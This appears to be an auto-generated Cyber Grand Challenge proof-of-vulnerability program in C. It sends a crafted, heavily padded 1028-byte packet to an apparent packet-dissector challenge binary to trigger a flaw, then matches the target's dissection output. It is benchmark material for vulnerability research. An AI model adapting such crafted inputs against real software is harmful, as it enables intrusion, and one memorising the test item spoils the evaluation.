#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x1b\xe1\xed\xb8"
         "\x21\x52\x31\x29\x70\x3e\xf7\xfb\x8a\xf9\x6d\xf4\xb0\xf3\x74\x5a"
         "\x08\x01\x00\x00\x26\xda\xd8\xff\x4f\xe9\x86\x21\xb4\x69\xae\x24"
         "\xc3\x62\x03\xd2\x1d\x60\x29\x6d\x0d\x29\x99\xe5\x81\x2f\xb1\x93"
         "\xb8\x8e\x45\xbb\x53\x8a\x66\x8e\xc3\x74\x00\x05\x8d\x71\x72\xd5"
         "\x39\xb1\xa3\x6e\xef\x36\xe0\xd0\x7f\x17\x32\x0e\xe2\x6e\x7a\x82"
         "\xb5\xc6\xf5\x6b\x71\x90\x63\xcf\x47\xca\xf7\x4a\x0d\xf2\xf5\x69"
         "\x20\x05\x5a\x09\xe1\x86\x2c\xcb\x65\x2d\xd4\xfa\x2f\x7e\x1f\xa5"
         "\x0f\x92\xb8\xd3\x62\x6c\x44\xf3\x00\x0d\xd6\x95\xf0\x62\x37\xd1"
         "\xd1\x52\xee\x7b\xf8\xc8\x19\x97\x7a\x2d\xb8\xb9\x51\x6d\x42\x22"
         "\x07\xc4\x59\xaa\xb6\x0c\x1a\xf5\x4e\x94\xca\x8e\xa0\xe2\x28\x88"
         "\x5e\xa7\xcd\x49\x52\xd4\xdd\x1c\x6e\x33\xc8\x40\x94\x44\x61\xb4"
         "\x7d\x2d\x5a\xa2\x0a\x01\x37\xb2\x1f\xba\xd1\xa8\x86\x73\x8d\xfc"
         "\xd9\x68\x33\x1c\x49\xbf\x03\x6f\x5b\x35\x91\x53\x39\x2d\x3e\xff"
         "\xbc\xbe\xb9\x63\x6d\x86\xc0\xc6\xf8\x8f\x4f\xbb\x4e\x0e\x58\xb4"
         "\x7c\x03\xca\xab\x6a\x40\x95\x25\x70\xb0\x96\x05\x2c\x1a\x58\x47"
         "\x29\x16\x38\xed\x80\xdc\x23\x73\x2a\x6b\x4a\x73\x4f\x6a\x4d\x27"
         "\x54\x8b\x40\xc0\x0f\xc8\x1b\xf6\x9b\x7d\xc9\x26\xd1\xab\x95\x48"
         "\xba\xb6\x01\xb5\xe3\xe4\x9a\x6a\x43\xb7\x54\x35\x2c\xc8\xa6\x8e"
         "\x9b\x43\xba\xb2\xb8\x92\x44\xd1\x2e\x90\x5b\x5f\xd3\x27\x00\x85"
         "\x84\xf0\xb8\x85\xc6\x20\x0d\x04\xf6\x5f\x30\xfd\x04\xec\x17\xaa"
         "\x71\xad\xd0\x0b\x4c\xbd\x33\x66\xf7\xab\xa5\x78\x30\xd6\x24\x5b"
         "\x76\xe3\xc4\x07\x04\xfe\x03\x70\xea\x56\x26\x56\x85\x64\x24\x4e"
         "\x62\xea\xf6\xd9\xd4\x8f\x4b\x84\x78\xe2\x5a\xc5\x8e\x66\x16\x00"
         "\xfd\x63\x83\x42\x53\xc3\x27\x19\x2c\x3d\x3f\x61\xec\x39\x2f\x61"
         "\x41\x8c\xd4\xef\x5f\xc6\x6b\x37\xb5\xd0\x08\x80\xc4\xe3\x5a\x46"
         "\x5d\x58\x1f\xf4\xad\xad\xfe\x72\x76\xd8\x26\xe0\x33\x43\xfb\xc0"
         "\x5f\xc8\xd0\x92\x19\xcd\x9a\xb2\xd7\x4d\x5b\x53\x8f\x24\x94\x95"
         "\x09\x5c\x25\x58\x2f\x8d\xe3\xeb\xc2\x76\x7a\x09\x26\xe1\xb0\x6b"
         "\xc6\x1a\x6a\x8b\xe4\x32\xc0\x5c\x7d\xb2\x53\xa8\x68\x20\x37\xfa"
         "\x87\x96\xfb\xe2\x64\xf2\x5f\x96\x57\xdc\x0d\x68\x32\xdb\x6a\xe7"
         "\x36\x58\x76\x34\x19\xb8\x3d\x23\xea\x4e\x98\x7d\x4b\xff\x1e\xf3"
         "\x01\x31\x5b\x64\xe9\xa0\x5e\xce\x94\x62\x1e\xc6\xc8\x9a\xff\x27"
         "\xe3\x81\xa6\x24\x73\x5c\xea\xd3\x52\x61\x46\x6d\x34\x94\xc5\x6d"
         "\xc1\xe4\x7c\x78\xf9\xf0\xe5\xb7\x37\x62\x78\x1d\x38\x69\x1d\x4e"
         "\x2c\x7d\x6e\x91\xdb\x3e\xae\xe4\x7c\xee\xcc\xb5\x87\x9a\xa8\x49"
         "\xf3\x06\xf9\x92\x08\x9b\x6d\x4f\x68\x6a\x00\xa1\x45\xfa\x1f\xc8"
         "\xa7\xf1\x43\xf0\x60\x8d\x07\x07\xd8\xbf\xc3\x97\xf5\xc8\xf7\x58"
         "\x46\x2d\x89\x41\x6b\x0a\x9e\xa0\x18\xed\x05\xe6\xb6\x72\x62\x65"
         "\x72\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===nontechnicalrongeur
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6e\x6f\x6e\x74\x65\x63\x68\x6e\x69\x63\x61"
         "\x6c\x72\x6f\x6e\x67\x65\x75\x72";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
